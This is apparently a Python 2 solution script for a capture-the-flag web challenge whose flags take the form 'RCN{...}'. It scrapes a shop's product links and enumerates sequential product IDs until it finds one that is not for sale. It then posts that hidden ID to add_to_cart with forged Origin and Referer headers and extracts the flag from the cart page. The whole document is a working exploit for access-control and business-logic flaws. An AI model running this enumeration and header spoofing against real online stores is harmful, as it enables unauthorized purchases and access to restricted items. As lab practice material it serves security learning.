#!/usr/bin/env python
import requests
import re
from bs4 import BeautifulSoup as bs
import sys

usage = "%s: <url of target>"

if len(sys.argv) !=2:
    exit(usage % sys.argv[0])

s = requests.session()

patt = re.compile('RCN{[^}]*}')

url = sys.argv[1] + '/'
r = s.get(url)

soup = bs(r.text,features="html.parser")
links = [a['href'] for a in soup.findAll('a')]

enums = []
for link in links:
    if '/' in link[1:]:
        base = '/'.join(link.split('/')[:-1])
        enums.append(int(link.split('/')[-1]))

#print base

target = url + 'add_to_cart'

#last = max(enums)
last = 0

found = False

hidden = last + 1

while not found:
    r = s.get(url + base + '/' + str(hidden))
    if "That item is not for sale at this time" in r.text:
        found = True
    else:
        hidden += 1


#data = {'product_id': str(max(enums)+1)}
data = {'product_id': str(hidden)}

headers = {
    'Origin': url, 
    'Referer': str(url + base[1:] + '/' + str(hidden)),
}

r = s.post(target,data=data,headers=headers)
cookies = r.cookies
r = s.get(url + "cart", cookies=cookies)

match = patt.findall(r.text)
if match:
    print match[0]

